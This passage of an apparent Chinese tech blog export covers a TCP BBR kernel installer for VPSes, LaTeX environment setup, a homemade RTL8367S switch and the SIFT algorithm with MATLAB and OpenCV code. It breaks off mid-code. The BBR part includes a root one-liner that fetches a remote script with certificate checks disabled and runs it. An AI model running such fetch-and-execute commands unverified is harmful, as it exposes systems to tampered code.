VPS 全部测试通过。\n当脚本检测到 VPS 的虚拟方式为 OpenVZ\n时，会提示错误，并自动退出安装。\n脚本运行完重启发现开不了机的，打开 VPS 后台控制面板的 VNC, 开机卡在\ngrub 引导, 手动选择内核即可。\n由于是使用最新版系统内核，最好请勿在生产环境安装，以免产生不可预测之后果。\n\n使用方法\n\n使用root用户登录，运行以下命令：\nwget --no-check-certificate https://github.com/teddysun/across/raw/master/bbr.sh &amp;&amp; chmod +x bbr.sh &amp;&amp; ./bbr.sh\n安装完成后，脚本会提示需要重启 VPS，输入 y 并回车后重启。\n重启完成后，进入 VPS，验证一下是否成功安装最新内核并开启 TCP\nBBR，输入以下命令：\nuname -r\n查看内核版本，显示为最新版就表示 OK 了\n检查点1\nsysctl net.ipv4.tcp_available_congestion_control\n返回值一般为：\nnet.ipv4.tcp_available_congestion_control = bbr cubic reno\n检查点2\nsysctl net.ipv4.tcp_congestion_control\n返回值一般为：\nnet.ipv4.tcp_congestion_control = bbr\n检查点3\nsysctl net.core.default_qdisc\n返回值一般为：\nnet.core.default_qdisc = fq\n检查点4\nlsmod | grep bbr\n返回值有 tcp_bbr 模块即说明 bbr 已启动。注意：并不是所有的 VPS\n都会有此返回值，若没有也属正常。\n\n"},{"title":"LaTeX环境配置（Linux&Win）","url":"/2018/01/26/LaTeX%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%EF%BC%88Linux&Win%EF%BC%89/","content":"\nLaTeX介绍\nLaTex是一种基于TeX的排版系统，最初由美国计算机学家Leslie\nLamport在20四级80年代初开发，在对于生成包含复杂表格和数学公式的书籍质量的印刷品，TeX发挥着强大功能。\nTeX在不同的系统下有不同的实现版本(MiKTeX、pdfTeX、xelaTeX、CTeX)，有时一种操作系统中也会有几种TeX系统。目前系统对应推荐关系如下：\n\n\n\nUnix(mac)\n类Unix(Linux)\nwindows\n\n\n\n\nMacTex\nTexlive\nMikTex\n\n\n\n\nCTeX指的是CTeX中文套装的简称，是把MiKTeX和一些常用的相关工具，如GSview，WinEdt\n等包装在一起制作的一个简易安装程序，并对其中的中文支持部分进行了配置，使得安装后马上就可以使用中文。\n\n\nTeXLive 是由国际 TeX 用户组织 TUG 开发的 TeX\n系统，支持不同的操作系统平台。其 Windows 版本又称 fpTeX ， Unix/Linux\n版本即著名的 teTeX 。\n\nlinux环境下LaTeX配置\n总体方案介绍\n\nTexLive + Atom编译器（3个Atom插件） + 添加win字体\n\nLaTeX基础环境配置\n\n在有apt包管理的Linux发行版本上，如(ubuntu,deepin,debian)，其安装相对容易。命令如下：\n\nsudo apt-get updatesudo apt-get install texlive-full\n其中，-full注明安装所有扩展组件（xelaTeX、语言字体包等），建议直接安装-full版本，虽然硬盘空间占用较大，但免去了单个配置的苦恼。\n\n非apt的Linux发行版本可能需要自行texlive官网下载最发行版本并安装。\n\natom(IDE)相关配置\n\nAtom\n是github专门为程序员推出的一个跨平台文本编译器。具有简洁和直观的图形用户界面，经过简单的配置，足够胜任各类语言的IDE(集成开发环境)\n\n因为atom在大多数的linux发行版本中均未有收录，需要自行添加仓库源，或者去官网下载安装，这里为了便于更新，提供添加apt源，以及apt安装方式介绍：\nsudo add-apt-repository ppa:webupd8team/atomsudo apt-get updatesudo apt-get install atom\natom若作为latex的开发环境，需要配合以下插件使用(直接在atom中安装)：\n\natom-latex\nlanguage-latex\npdf-view\n\n另外建议安装simplified-chinese-menu插件，对atom菜单进行汉化。\n因对兼容性的设置，若对一般latex编写，建议Latex编译器使用xelatex，在atom-latex插件中设置如下：\n\nToolchain to use 选择\ncustom Toolchain\nLaTeX compiler to use 修改为 xelatex\nbibTeX compiler to use 修改为 xelatex\nPreview PDF after building process 选择\nDo nothng\n\n将win下字库迁移到linux下\n因为win下大多字体均是微软公司授权或其他公司向用户授权，大多是非开源字体，因此在Linux或TeX发型版本中均不自带。但在发型书籍时候，使用的大多字体：英文下的新罗马字体（Times\nNew\nRoman），中文下宋体(SimSun)，楷体（KaiTi）均为非开源字体。若在Linux下使用，需要自行移植安装。\n注意：不能直接安装，直接安装后会存在于本用户的目录下，texlive仅仅调用系统共有字体文件夹下所有字体步骤如下\n复制win字体到Linux字体文件夹\nwindows字体文件夹位置：C://WINDOWS/Fonts\nLinux下字体文件夹位置：/usr/share/fonts\n建议将windows下所有字体复制到/usr/share/fonts/windows-fonts下，使用cp命令。\n例如在windows字体文件夹下打开终端\nsudo mkdir /usr/share/fonts/windows-fontssudo cp * /usr/share/fonts/windows-fonts\n刷新字体缓存，使字体生效\nsudo fc-cache -f -v\nWin环境下LaTeX配置\nwindows环境下方案很多，这里推荐直接安装相同的Texlive套件，其直接包含MiKTeX和CTeX\n点击转至Texlive国内清华源\n下载文件类型为ios，请解压或挂载后安装。\n针对前端的IDE仍建议使用Atom，有了能力者可以使用WinEdt。\n\nAtom\n配置见2.2，但注意：请从官网直接下载atom并安装，其余配置一致；\n因为不存在字体缺失问题，直接使用即可。\n\n"},{"title":"RTL8367S自制网管交换机","url":"/2024/05/11/RTL8367S%E8%87%AA%E5%88%B6%E7%BD%91%E7%AE%A1%E4%BA%A4%E6%8D%A2%E6%9C%BA/","content":"RTL8367S自制网管交换机\n\nRTL8367S 芯片官网介绍\n\nRTL8367S-CG\n二层管理 5+2 端口 10/100/1000M 交换机控制器\n概述\nRTL8367S-CG 是一款 LQFP-128 封装的高性能 5+2 端口 10/100/1000M\n以太网交换机，具有低功耗集成 5 端口 Giga-PHY，支持\n1000Base-T、100Base-TX 和 10Base-T传输标准。\n对于特定应用，RTL8367S 支持一个额外的接口，可配置为 RGMII/MII 接口。\nRTL8367S 还支持一个可配置为 SGMII/HSGMII 接口的 Ser-Des 接口。\nRTL8367S集成了高速交换机系统的所有功能；包括用于数据包缓冲的\nSRAM、无阻塞交换结构以及单个 CMOS 器件中的内部寄存器管理。\n特点\n单芯片 5+2 端口 10/100/1000M 无阻塞交换架构\n嵌入式 5 端口 10/100/1000Base-T PHY\n每个端口支持全双工 10/100/1000M 连接（半双工仅在 10/100M\n模式下支持）\n额外接口（扩展 GMAC1）支持\nSGMII (1.25GHz) 接口\nHSGMII (3.125GHz) 接口\n额外接口（扩展GMAC2）支持\n媒体独立接口 (MII)\n简化的 10/100/1000M 媒体独立接口 (RGMII)\n通过 IEEE 802.3x 流量控制和背压进行全双工和半双工操作\n应用\n5 端口 1000Base-T 路由器，带 SGMII/HSGMII 和/或 MII/RGMII\n\n芯片官网介绍：https://www.realtek.com/Product/Index?id=3699\nRTL8367S-CG_Datasheet.pdf1\n原理图\n\n外围电路\n\n使用 USB-C 输出5V电源\n使用 SY8088IAAC 实现 5V 降压\n3.3V，使用RTL8367S自带电压转换输出1.1V\n使用 W25Q32JVSSIQ 4MB spi norflash 存储固件\n使用 5个 HR911130A 自带变压器和 LED 的单端口RJ45连接器\n转出 TX/RX 串口\n带 3.3V 供电拉低按钮 + 芯片重置按钮\n25M 晶振时钟\n\n3D效果图\n\n固件\n借用网件GE105Ev2的固件 \nhttps://www.netgear.com/cn/business/wired/switches/plus/gs105ev2/\n网件固件.bin，大小2M。\n使用烧录器（例如CH341）烧写到 spi norflash中。\n修改mac地址\n固件MAC地址固定为00:00:00:00:00:01，编辑固件中偏移地址\n0x1FC000指定MAC地址，可以随机生成MAC\n\n\n\nweb管理截图\n\n\n\n\nRTL8367S-CG_Datasheet.pdf↩︎\n\n\n"},{"title":"SIFT算法深入理解","url":"/2020/02/23/SIFT%E7%AE%97%E6%B3%95%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3/","content":"SIFT算法深入理解\nSIFT（Scale Invariant Feature\nTransform），尺度不变特征变换匹配算法，是由David\nG. Lowe在1999年（《Object Recognition from Local Scale-Invariant\nFeatures》）提出的高效区域检测算法，在2004年（《Distinctive Image\nFeatures from Scale-Invariant Keypoints》）得以完善。\nSIFT特征对旋转、尺度缩放、亮度变化等保持不变性，是非常稳定的局部特征，现在应用很广泛。SIFT算法是将Blob检测，特征矢量生成，特征匹配搜索等步骤结合在一起优化。\n\n1. DOG尺度空间构造\n尺度空间理论\n尺度越大图像越模糊。\n用机器视觉系统分析未知场景时，计算机并不预先知道图像中物体的尺度。我们需要同时考虑图像在多尺度下的描述，获知感兴趣物体的最佳尺度。另外如果不同的尺度下都有同样的关键点，那么在不同的尺度的输入图像下就都可以检测出来关键点匹配，也就是尺度不变性。\n图像的尺度空间表达就是图像在所有尺度下的描述。\n高斯模糊\n高斯核是唯一可以产生多尺度空间的核。一个图像的尺度空间L(x, y, σ)，定义为原始图像I(x, y)与一个可变尺度的2维高斯函数G(x, y, σ)的卷积运算。\n二维空间高斯函数：$G(x_i,y_i,\\sigma)=\\frac{1}{2\\pi\\sigma^2}exp\\lgroup-\\frac{(x-x_i)^2+(y-y_i)^2}{2\\sigma^2}\\rgroup$\n尺度空间：L(x, y, σ) = G(x, y, σ) * I(x, y)\n\nmatlab代码：\n% 先限定三维图中的x,y轴坐标范围X = 1 : 1 : 100;Y = 1 : 1 : 100;% X，Y方向公用的标准差sigma = 15;Z = zeros( 51, 51 );for row = 1 : 1 : 100    for col = 1 : 1 : 100        Z( row, col ) = ( X(row) - 50 ).^2 + ( Y(col) - 50 ).^2;    endendZ = 1/(2 * pi * sigma^2) * exp(-Z / ( 2 * sigma^2 ));% 显示高斯函数的三维曲面figure, surf(X, Y, Z);\n分布不为零的点组成卷积阵与原始图像做变换，即每个像素值是周围相邻像素值的高斯平均。一个5*5的高斯模版如下所示：\n\n\n高斯模板是圆对称的。模板中心权重最大，距离中心越远权重越小。实际计算中，大于3σ以外的像素基本不起作用，计算可忽略。所以，单像素只需要计算(6σ + 1) ⋅ (6σ + 1)的方形区域。\n高斯模糊是线性可分的。二维高斯矩阵变换可以通过在水平和竖直方向上用一维高斯矩阵变换相加得到。\n\n\n当N为高斯核大小，m，n为图像长和宽时，直接计算复杂度为O(N2mn)次乘法；使用相加简化为O(Nmn + Nmn)。\nopenCV中的函数：\nvoid cv::GaussianBlur(\tInputArray src,\tOutputArray dst,\tSize \tksize,\tdouble \tsigmaX,\tdouble \tsigmaY = 0,\tint \tborderType = BORDER_DEFAULT )\t\tPython:dst\t= cv.GaussianBlur(src, ksize, sigmaX[, dst[, sigmaY[, borderType]]])\n\nsrc - 输入图像\ndst - 与输入图像尺寸一致的输出图像\nksize -\n高斯核大小。可定制长宽，必须为正奇数，当为零是采用sigma计算\nsigmaX - X方向上的高斯核标准偏差\nsigmaY - Y方向上的高斯核标准偏差\nboerderType - 像素外推法\n\n金字塔多分辨率\n金字塔是早期图像多尺度的表示方式。图像金字塔化一般两个步骤：\n\n使用低通滤波器（LPF）平滑图像；\n对平滑图像降采样（通常$\\frac{1}{2}$）\n\n该方式能得到系列尺寸缩小的图片。\n原图（l = 0）\n$\\frac{1}{2}(l=1)$\n$\\frac{1}{4}(l=2)$\n$\\frac{1}{8}(l=3)$\n$\\frac{1}{16}(l=4)$\nmatlab代码：\nlena=imread(&#x27;lena.png&#x27;);lena_size = size(lena);% 3*3高斯滤波算子(sigma=0.5)，这里暂时使用相同的sigmaGF=fspecial(&#x27;gaussian&#x27;,3,0.5);% 使用卷积conv，沿自身边界进行镜像扩展symmetric，输出与输入大小一致samelena_GF=imfilter(lena, GF, &#x27;conv&#x27;,&#x27;symmetric&#x27;,&#x27;same&#x27;);%去除偶数行和列，得到降采样imageDS=lena_GF(1:2:lena_size(1), 1:2:lena_size(2),:);imshow(imageDS);\n可见对于二维图像，一个传统的金字塔，每一层图像尺寸为上一层的$\\frac{1}{2}*\\frac{1}{2}=\\frac{1}{4}$。\n\n多尺度空间和金字塔多分辨率\n尺度空间表达和金字塔分辨率表达的明显区别有：\n\n尺度空间表达是由不同高斯核平滑卷积得到的，在所有尺度上分辨率相同；\n金字塔多分辨率表达每层分辨率减少固定比率。\n\n因此，金字塔多分辨率生成快，空间少，但局部特征描述单一；多尺度空间的图片局部特征可以在不同尺度描述，但随尺度参数增加会增加冗余信息。\n高斯拉普拉斯金字塔（ LoG）\nLoG（Laplace of\nGaussian），也称作拉普拉斯金字塔。其结合了尺度空间表达核金字塔多分辨率表达，在使用尺度空间时使用金字塔表示，其算子是对高斯函数进行拉普拉斯变换。\n$$\nL(x,y,\\sigma)=\\frac{\\partial^2G}{\\partial x^2} +\n\\frac{\\partial^2G}{\\partial y^2}\n$$ 标准高斯卷积表达式G如下： $$\nG(x,y,\\sigma)=\\frac{1}{2\\pi\\sigma^2}e^{-\\frac{x^2+y^2}{2\\sigma^2}}\n$$ 原图像与高斯卷积的结果求二阶偏导（拉普拉斯变换）如下： Δ[G(x, y, σ) * I(x, y)] = [ΔG(x, y, σ)] * I(x, y) = L(x, y, σ) * I(x, y)\n对L求解如下： $$\n\\begin{align}\n\\frac{\\partial G}{\\partial x} &amp;=\n\\frac{1}{2\\pi\\sigma^2}e^{-\\frac{x^2+y^2}{2\\sigma^2}}\\cdot(-\\frac{x}{\\sigma^2})=-\\frac{x}{2\\pi\\sigma^4}e^{-\\frac{x^2+y^2}{2\\sigma^2}}\n\\\\\n\\frac{\\partial^2 G}{\\partial x^2} &amp;= \\frac{\\partial}{\\partial\nx}\\lgroup\\frac{\\partial G}{\\partial x}\\rgroup =\n-\\frac{1}{2\\pi\\sigma^4}e^{-\\frac{x^2+y^2}{2\\sigma^2}}+\\frac{x^2}{2\\pi\\sigma^6}e^{-\\frac{x^2+y^2}{2\\sigma^2}}\n\\end{align}\n$$ 同理： $$\n\\frac{\\partial^2 G}{\\partial y^2} =\n-\\frac{1}{2\\pi\\sigma^4}e^{-\\frac{x^2+y^2}{2\\sigma^2}}+\\frac{y^2}{2\\pi\\sigma^6}e^{-\\frac{x^2+y^2}{2\\sigma^2}}\n$$\n$$\n\\therefore L(x,y,\\sigma)=\\frac{\\partial^2 G}{\\partial\nx^2}+\\frac{\\partial^2 G}{\\partial y^2} =\n-\\frac{1}{\\pi\\sigma^4}[1-\\frac{x^2+y^2}{2\\sigma^2}]e^{-\\frac{x^2+y^2}{2\\sigma^2}}\n$$\n\nmatlab代码：\n% 先限定三维图中的x,y轴坐标范围X = 1 : 1 : 100;Y = 1 : 1 : 100;% X，Y方向公用的标准差sigma = 15;Z = zeros( 51, 51 );for row = 1 : 1 : 100    for col = 1 : 1 : 100        Z( row, col ) = ( X(row) - 50 ).^2 + ( Y(col) - 50 ).^2;    endendZ = - 1/(pi * sigma^4) * (1 - Z/(2*sigma^2) ) .* exp(-Z / ( 2 * sigma^2 ));% 显示高斯函数的三维曲面figure, surf(X, Y, Z);\nLoG用来从金字塔低层图像重建上层未采样图像，在数字图像处理中也即是预测残差，可以对图像进行最大程度的还原，配合高斯金字塔一起使用。\n高斯金字塔用来向下降采样图像，而拉普拉斯金字塔则用来从金字塔底层图像中向上采样重建一个图像。\n在高斯金字塔中，要从金字塔第i层生成第i + 1层（我们表示第i + 1层为Gi + 1），我们先要用高斯核对Gi进行卷积，然后删除所有偶数行和偶数列。新得到图像面积会变为源图像的四分之一。按上述过程对输入图像G0执行操作就可产生出整个金字塔。\n下式是LoG第i层的数学定义：\n$$\n\\begin{align}\nL_i &amp;= G_i-Up(G_{i+1})\\otimes g \\\\\n&amp;=G_i - PyrUp(G_{i+1}) \\\\\n\\end{align}\n$$ 式中，Gi表示高金字塔中第i层图像。Up()上采样操作是将Gi + 1层图像位置中为(x, y)的像素映射到图像(2x + 1, 2y + 1)的位置，其余位置用0填充。采样结果与高斯核g卷积，注意缩小的时候用什么核，这里就用什么核。Gi − Up(Gi + 1) ⊗ g可以描述为PyrUp(Gi + 1)函数。\n也就是说，拉普拉斯金字塔是通过高斯金字塔图像减去先缩小后再放大的图像的一系列图像构成的。\n高斯差分金字塔（ DoG）\nLoG的主要缺点是需要求二阶导，计算较复杂，因此我们就想用别的算子去近似它。DoG（Difference\nof Gaussian），相当于对LoG（σ2Δ2G）的近似计算，SIFT算法中，建议某一尺度的特征检测，可以通过两个相邻高斯尺度空间的图像相减，得到DoG的响应值图像D(x, y, σ)。然后仿照LoG方法，对D(x, y, σ)进行局部最大值搜索，在空间位置和尺度空间定位局部特征点。\nDoG与LoG也存在以下关系： $$\n\\begin{align}\nD(x,y,\\sigma) &amp;= (G(x,y,k\\sigma)-G(x,y,\\sigma))*I(x,y) \\\\\n   &amp;=L(x,y,k\\sigma)-L(x,y,\\sigma) \\\\\n\\end{align}\n$$ k为相邻两个尺度空间倍数的常数。\n\nmatlab绘图代码：\n%LoG与DoG一维函数图像差异syms LoG(x) DoG(x);sigma = 1;k = 2^(1/2);    %此处设S=2，k=2^(1/S)LoG(x) = - 1/(pi * sigma^4) * (1 - x^2/(2*sigma^2) ) * exp(-x^2 / ( 2 * sigma^2 ));DoG(x) = - 1/(pi * (k*sigma)^4) * (1 - x^2/(2*(k*sigma)^2) ) * exp(-x^2 / ( 2 * (k*sigma)^2 )) - LoG;fplot(LoG, &#x27;Linewidth&#x27;, 2);hold on;fplot(-DoG, &#x27;Linewidth&#x27;, 2);% x=0;y=0显示grid on;legend(&#x27;LoG&#x27;, &#x27;DoG&#x27;)line([0,0],[-0.35,0.06], &#x27;Color&#x27;,&#x27;black&#x27;, &#x27;LineWidth&#x27;, 0.5);line([-5,5],[0,0], &#x27;Color&#x27;,&#x27;black&#x27;, &#x27;LineWidth&#x27;, 0.5);\n上图是某层DoG与LoG的对比。\n构建高斯金字塔\n为了得到DoG图像，先要构造高斯金字塔。\n高斯金字塔在多分辨率金字塔简单降采样基础上加了高斯滤波，也就是对金字塔每层图像用不同参数的σ（上层为下层的k倍），做高斯模糊，使得每层金字塔有多张高斯模糊图像。\n金字塔每层多张图像合称为一组（Octave），每组有多张（Interval）图像。另外，降采样时，金字塔上边一组图像的第一张图像（最底层的一张）是由前一组（下面一组）图像的倒数第三张(从上往下第三张)隔点采样得到。\n\n因此有以下特点：\n\n在同一组内，不同层图像的尺寸是一样的，后一层图像的高斯平滑因子σ是前一层图像平滑因子的k倍；\n在不同组内，后一组第一个图像是前一组倒数第三个图像的$\\frac{1}{2}$采样，图像尺寸是前一组的$\\frac{1}{4}$。\n\n以下是openCV 2.4.2中高斯金字塔的构建源码：\n// 构建nOctaves组（每组nOctaveLayers+3层）高斯金字塔, nOctaves为输入变量void SIFT::buildGaussianPyramid( const Mat&amp; base, vector&lt;Mat&gt;&amp; pyr, int nOctaves ) const&#123;    vector&lt;double&gt; sig(nOctaveLayers + 3);    pyr.resize(nOctaves*(nOctaveLayers + 3));     //  \\sigma_&#123;total&#125;^2 = \\sigma_&#123;i&#125;^2 + \\sigma_&#123;i-1&#125;^2\t// 预计算对不同层的高斯平滑因子，关于此处的计算见下说明2    sig[0] = sigma;    double k = pow( 2., 1. / nOctaveLayers );\t\t//k = 2^&#123;\\frac&#123;1&#125;&#123;nOctaveLayers&#125;&#125;    for( int i = 1; i &lt; nOctaveLayers + 3; i++ )    &#123;        double sig_prev = pow(k, (double)(i-1))*sigma;        double sig_total = sig_prev*k;        //关于此处计算见说明3        sig[i] = std::sqrt(sig_total*sig_total - sig_prev*sig_prev);    &#125;     for( int o = 0; o &lt; nOctaves; o++ )    &#123;\t\t// DoG金子塔需要nOctaveLayers+2层图像来检测nOctaves层尺度\t\t//所以高斯金字塔需要nOctaveLayers+3层图像得到nOctaveLayers+2层DoG金字塔        for( int i = 0; i &lt; nOctaveLayers + 3; i++ )        &#123;\t\t\t// dst为第o组（Octave）金字塔            Mat&amp; dst = pyr[o*(nOctaveLayers + 3) + i];\t\t\t// 第0组第0层为原始图像            if( o == 0  &amp;&amp;  i == 0 )                dst = base;            \t\t\t// 每一组第0副图像时上一组倒数第三幅图像隔点采样得到            else if( i == 0 )            &#123;                const Mat&amp; src = pyr[(o-1)*(nOctaveLayers + 3) + nOctaveLayers];                resize(src, dst, Size(src.cols/2, src.rows/2),                       0, 0, INTER_NEAREST);            &#125;\t\t\t//每一组第i(i!=0)副图像是由第i-1副图像进行sig[i]的高斯模糊得到\t\t\t// 也就是本组图像在sig[i]的尺度空间下的图像            else            &#123;                const Mat&amp; src = pyr[o*(nOctaveLayers + 3) + i-1];                GaussianBlur(src, dst, Size(), sig[i], sig[i]);            &#125;        &#125;    &#125;&#125;\n说明：\n\n高斯金字塔的组数O = [log2(min(m, n))] − 3；\n关于计算计算高斯模糊的系数σ，有以下关系：\n$$\n\\sigma(o,s) = \\sigma(o,0)\\cdot2^{\\frac{s}{S}}\n$$\n且存在以下关系：\nσ(o + 1, 0) = σ(o, S)\n其中，σ为尺度空间坐标，o为组坐标，s为每组中的层座标，σ(o, 0)为该组的初始尺度，S为每组层数（3~5）。可以得到：\n\n组内相邻图像尺度关系：$\\sigma(o,s+1)=\\sigma(o,s)\\cdot2^\\frac{1}{S}$\n相邻组间尺度关系： $$\n\\begin{align}\n\\sigma(o+1,s) &amp;= \\sigma(o+1,0)\\cdot2^{\\frac{s}{S}} \\\\\n&amp;= \\sigma(o,S)\\cdot2^{\\frac{s}{S}} \\\\\n&amp;= \\sigma(o,0)\\cdot2^{\\frac{s+S}{S}} \\\\\n&amp;=2\\sigma(o,s)\n\\end{align}\n$$\n\n所以相邻两组的同一层尺度大小为2倍关系。\n最终尺度序列可得： $$\n\\bar\\sigma = 2^{o-1}(\\sigma,k\\sigma,k^2\\sigma,\\dots k^{s-1}\\sigma),\\\nk=2^{\\frac{1}{S}}\n$$ 即： $$\n\\sigma(o,s)=2^{o-1}k^{(s-1)}\\sigma,\\ k=2^{\\frac{1}{S}}\n$$\n$$\n\\begin{align}\n\\bar\\sigma_i&amp;=\\sqrt{k^{(i-1)}\\sigma*k*k^{(i-1)}\\sigma*k-k^{(i-1)}\\sigma*k^{(i-1)}\\sigma}\n\\\\\n(\\bar\\sigma_i)^2&amp;=k^{2(i-1)}\\sigma^2(k^2-1) \\\\\n&amp;= k^{2(i-1)}\\sigma^2(2^{\\frac{2}{S}}-1)\n\\end{align}\n$$\n当且仅当S = 2时成立，此时每组2 + 3 = 5层\n\n构建DoG金字塔\n构建高斯金字塔之后，就是用金字塔相邻图像相减构造DoG金字塔。\n\n如上图所示，高斯尺度金字塔每组中有五层不同尺度图像，相邻两层相减得到四层DoG结果，接下来需要这四层DoG图像上寻找局部极值点（关键点）。\n//构建nOctaves组（每组nOctaveLayers+2层，因为相减生成会少一层）高斯差分金字塔void SIFT::buildDoGPyramid(const vector&lt;Mat&gt;&amp; gpyr, vector&lt;Mat&gt;&amp; dogpyr ) const&#123;    int nOctaves = (int)gpyr.size()/(nOctaveLayers + 3);    dogpyr.resize( nOctaves*(nOctaveLayers + 2) );     for( int o = 0; o &lt; nOctaves; o++ )    &#123;        for( int i = 0; i &lt; nOctaveLayers + 2; i++ )        &#123;\t\t\t// DoG第o组第i副 = 高斯金字塔第o组第i+1层 - 高斯金字塔第o组i层            const Mat&amp; src1 = gpyr[o*(nOctaveLayers + 3) + i];            const Mat&amp; src2 = gpyr[o*(nOctaveLayers + 3) + i + 1];            Mat&amp; dst = dogpyr[o*(nOctaveLayers + 2) + i];            subtract(src2, src1, dst, noArray(), CV_16S);        &#125;    &#125;&#125;\n值得注意的是高斯金字塔每组为nOctaves+3层，为得到DoG金字塔相减计算后，会少一层为nOctaves+2层。\n2. 关键点搜索与定位\nDoG局部极值点\n极值点定义：每一个像素点与它所有相邻点比较，当其大于（或小于）它的图像域和尺度域的所有相邻点时，即为极值点。\n如下图所示，比较范围是一个3 × 3 × 3的立方体，中间检测点需与周围26个点比较，确保尺度空间和图像空间都为极值点。\n\n具体方法是：在每一组（Octaves）中，从第二层（设为当前层）开始搜索，此时第一层和第三层分别为二层的下层和上层；搜索完成后，置当前层为第三层，开始下次搜索；因此每层会被比较两次。通常我们将组编号索引从-1开始，每组除0层和最高层都会被当作当前搜索层。\n\n如上图，表示了高斯金字塔，DoG金字塔和DoG极值点计算层的关系。\n关键点精确定位(DoG特征点的修正)\n上述的的关键点计算中，使用的是离散空间的像素值点，但由于离散点并不能准确描述“真正”的极值点，存在误差，需要对DoG金字塔图像进行进一步拟合。\n\n利用已知的离散空间点插值得到连续空间极值点的方法叫做子像元插值。\n首先来看一个一维函数插值的例子f(x) = −3x2 + 2x + 6，如下图：\n\nmatlab绘图代码：\nsyms f(x);f(x) = -3*x^2 + 2*x + 6;fplot(f(x), &#x27;Linewidth&#x27;, 1.5)hold on;axis([-1.5, 2, -1, 7]);  % 设置坐标轴在指定的区间% 特殊点x = [-1, 0, 1/3, 1];y = f(x);plot(x, y,  &#x27;LineWidth&#x27;, 1, &#x27;LineStyle&#x27;, &#x27;--&#x27;);line([-2,2],[0,0], &#x27;Color&#x27;,&#x27;black&#x27;, &#x27;LineWidth&#x27;, 0.7);line([-1,-1],[0,1], &#x27;Color&#x27;,&#x27;black&#x27;, &#x27;LineWidth&#x27;, 1, &#x27;LineStyle&#x27;, &#x27;--&#x27;);line([0,0],[0,6], &#x27;Color&#x27;,&#x27;black&#x27;, &#x27;LineWidth&#x27;, 1,  &#x27;LineStyle&#x27;, &#x27;--&#x27;);line([1/3,1/3],[0,19/3], &#x27;Color&#x27;,&#x27;black&#x27;, &#x27;LineWidth&#x27;, 1,  &#x27;LineStyle&#x27;, &#x27;--&#x27;);line([1,1],[0,5], &#x27;Color&#x27;,&#x27;black&#x27;, &#x27;LineWidth&#x27;, 1,  &#x27;LineStyle&#x27;, &#x27;--&#x27;);legend(&#x27;f(x) = -3*x^2 + 2*x + 6&#x27;);\n图中可见，连续空间和离散空间的极值点并不重合。我们需要先引进Taylor（泰勒）展开式：\n$$\nf(x)=\\sum_{i=0}^{n} \\frac{f^{(i)}(x_0)}{i!}(x-x_0)^i\n$$ 我们对函数f(x)使用泰勒级数展开：\n$$\n\\begin{align}\nf(x)&amp; \\approx f(0) + f'(0)x + \\frac{f''(0)}{2}x^2 \\\\\nf(x)&amp; \\approx 6 + 2x -3x^2\n\\end{align}\n$$ 补充——离散空间的一阶导数和二阶导数的求法：\n$$\n\\begin{align}\nf'(x)&amp;=\\frac{f(x+h)-f(x-h)}{2h} \\\\\nf''(x)&amp;=\\frac{f(x+h)+f(x-h)-2f(x)}{h^2}\n\\end{align}\n$$ 使用泰勒展开后求得f(x)后，可以求得连续函数f(x)真正的极大值坐标：\n$$\n\\begin{align}\nf'(x)=2-6x=0 \\Rightarrow \\bar x= \\frac{1}{3} \\\\\nf(\\bar x)=6+2\\times\\frac{1}{3}-3\\times(\\frac{1}{3})^2=6\\frac{1}{3}\n\\end{align}\n$$ 对于二维函数，其泰勒展开为： $$\nf(x,y)\\approx f(0,0)+(\\frac{\\partial f}{\\partial x}x+\\frac{\\partial\nf}{\\partial y}y)+\\frac{1}{2}(x^2\\frac{\\partial^2f}{\\partial x \\partial\ny}+2xy\\frac{\\partial^2f}{\\partial x \\partial\ny}+y^2\\frac{\\partial^2f}{\\partial y \\partial y})\n$$ 若将$\\begin{bmatrix} x\\\\\ny\\end{bmatrix}$表示成向量x⃗，上式变形为： $$\nf(\\vec{x})\\approx f(\\vec{0})+\\frac{\\partial f^T}{\\partial x}x+\n\\frac{1}{2}x^T\\frac{\\partial^2f}{\\partial x^2}x\n$$ 注意：此处的存在的一阶导数和二阶导数都是$x= \\begin{bmatrix} 0\\\\\n0\\end{bmatrix}$这个点时的一阶导和二阶导的值。\n对上式求导，以便取得极值点： $$\n\\frac{\\partial f}{\\partial x} = \\frac{\\partial f^T}{\\partial\nx}+\\frac{1}{2}(\\frac{\\partial^2f}{\\partial\nx^2}+\\frac{\\partial^2f^T}{\\partial x^2})x=0\n$$ 此处两个导数和之前一样，此时可以求得真正的极值点： $$\n\\hat x=-\\frac{\\partial^2f^{-1}}{\\partial x^2}\\cdot\\frac{\\partial\nf}{\\partial x}\n$$ 带入泰勒展开式，得到极值点函数值： $$\nf(\\hat x)=f(\\vec{0})+\\frac{\\partial f^T}{\\partial\nx}\\hat{x}+\\frac{1}{2}\\hat{x}^T\\frac{\\partial^2f}{\\partial\nx^2}\\hat{x}=f(\\vec{0})+\\frac{1}{2}\\frac{\\partial f^T}{\\partial x}\\hat{x}\n$$ 我们回到DoG函数，同样得到D(X)的泰勒展开： $$\nD(X)\\approx D+\\frac{\\partial D^T}{\\partial X}X+\n\\frac{1}{2}X^T\\frac{\\partial^2D}{\\partial X^2}X\n$$ 此处的D即是在0点的函数值。设极值点为X̂ = (x, y, σ)T\n若X̂在任何方向上的偏移大于$\\frac{1}{2}$时(一格的一半)，意味着插值中心点已经偏移到它的临近点上，所以这样的点需要删除。另外，下示程序还删除了极值小于0.04的点（|D(X̂)| &lt; 0.04，图像的灰度值在0~1之间），其响应值过小，这样的点易受噪声的干扰而变得不稳定，所以也要被删除。\n// 在DoG尺度空间寻特征点（极值点） Bad features are discarded// based on contrast and ratio of principal curvatures.void SIFT::findScaleSpaceExtrema( const vector&lt;Mat&gt;&amp; gauss_pyr, const vector&lt;Mat&gt;&amp; dog_pyr, vector&lt;KeyPoint&gt;&amp; keypoints ) const&#123;    int nOctaves = (int)gauss_pyr.size()/(nOctaveLayers + 3);\t\t// 用于过滤掉半均匀（低对比度）区域中的弱特征的对比度阈值。 阈值越大，检测器产生的特征越少。\t// 过滤掉弱特征的阈值 contrastThreshold默认为0.04    int threshold = cvFloor(0.5 * contrastThreshold / nOctaveLayers * 255 * SIFT_FIXPT_SCALE);    const int n = SIFT_ORI_HIST_BINS; //36    float hist[n];    KeyPoint kpt;     keypoints.clear();     for( int o = 0; o &lt; nOctaves; o++ )        for( int i = 1; i &lt;= nOctaveLayers; i++ )        &#123;            int idx = o*(nOctaveLayers+2)+i;\t//idx当前DoG层序号            const Mat&amp; img = dog_pyr[idx];            const Mat&amp; prev = dog_pyr[idx-1];            const Mat&amp; next = dog_pyr[idx+1];            int step = 